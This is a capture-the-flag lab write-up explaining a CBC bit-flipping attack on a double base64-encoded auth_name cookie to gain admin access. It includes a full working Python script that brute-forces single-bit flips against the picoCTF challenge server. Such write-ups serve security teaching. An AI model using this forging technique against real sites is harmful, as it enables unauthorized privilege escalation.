# Lab 12: More Cookies

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Concepts:** Cryptography, CBC Bit Flipping, Double Base64 Encoding

## Description
In this challenge, the application handles authorization via an `auth_name` cookie. However, unlike standard signed cookies, this cookie is encrypted using a CBC (Cipher Block Chaining) cipher and then double base64-encoded. The goal is to manipulate the ciphertext to elevate our privileges to the "admin" role.

## Vulnerability Analysis
The site is vulnerable to a **CBC Bit-Flipping Attack**. In CBC mode, a flipped bit in a ciphertext block will completely scramble the corresponding plaintext block, but it will cause a predictable bit-flip in the *same position* of the next plaintext block. 

By systematically flipping every bit in the ciphertext and sending the forged cookie back to the server, we can eventually alter the underlying plaintext username (e.g., from `user` or `guest` to `admin`) without needing to know the secret encryption key.

## Exploitation Steps

1. **Analyze the Cookie:** By inspecting the browser's storage, we find an `auth_name` cookie. Attempting to decode it from base64 reveals another base64 string. Decoding it a second time reveals the raw encrypted bytes.
2. **Automate the Attack:** Since doing this manually is impossible, we can write a Python script to automate the bit-flipping process.
3. **The Payload Script:** The script decodes the cookie twice, iterates over every byte and bit, flips one bit at a time using the XOR operator (`^=`), re-encodes the forged cookie twice, and sends a GET request to the server.
4. **Capture the Flag:** We inspect the response text of every request for the `picoCTF{...}` flag. 

### Python Exploit Code (`solve_more_cookies.py`)

```python
import requests
import base64

# Note: Update URL based on the active instance
URL = "http://wily-courier.picoctf.net:49484/"

s = requests.Session()
s.get(URL)
cookie = s.cookies.get("auth_name")

if not cookie:
    print("[-] auth_name cookie not found")
    exit()

# The cookie is double base64 encoded
decoded_once = base64.b64decode(cookie)
cipher = base64.b64decode(decoded_once)

print("[+] Testing bit flips... This might take a minute.")

for i in range(len(cipher)):
    for bit in range(8):
        data = bytearray(cipher)
        
        # Flip the bit
        data[i] ^= 1 << bit

        # Encode TWICE to reconstruct the proper format
        encoded_once = base64.b64encode(bytes(data))
        forged_cookie = base64.b64encode(encoded_once).decode()

        # Send forged cookie back to the server
        r = requests.get(URL, cookies={"auth_name": forged_cookie})
        text = r.text

        if "picoCTF{" in text:
            start = text.find("picoCTF{")
            end = text.find("}", start) + 1
            print(f"\n[+] FLAG FOUND at index={i}, bit={bit}!")
            print(f"\n{text[start:end]}\n")
            exit()

print("[-] Testing complete. Flag not found.")